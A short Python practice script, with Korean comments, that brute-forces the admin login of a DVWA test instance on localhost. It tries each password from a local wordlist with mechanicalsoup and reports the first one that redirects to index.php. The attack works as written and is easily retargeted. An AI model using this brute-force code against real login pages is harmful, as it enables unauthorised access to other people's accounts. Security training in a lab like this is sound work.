
with open('C:\\Users\\root\\Downloads\\pw.txt', 'r') as f:
    #read는 파일의 내용을 읽어서 문자열로가져오고 readlines는 한줄씩 리스트형태로가져옴
    pwline = f.readlines()


words =[]
for word in pwline:
    words.append(word.strip().replace('\n','')) #words에 리스트로 추가,공백제거,개행문자제거



import mechanicalsoup


for i in words:
    browser = mechanicalsoup.StatefulBrowser()

    browser.open("http://localhost/dvwa/login.php")

    browser.select_form('form[action="login.php"]')
    browser["username"] = "admin"
    browser["password"] = i #words 패스워드 리스트들 for문 반복

    browser.submit_selected() #양식제출



#password값이 일치하지않아 로그인 실패시 browser.get_url의 값이 현재페이지인 loginphp로 나오게되며 로그인성공시에는 리다이렉션되는 index.php로 나오게됨 
    if browser.get_url() == "http://localhost/dvwa/index.php":
        print(f"로그인 성공 : {i}")
        break #로그인 성공시 종료
    else :
        print(f"로그인 실패 : {i}")
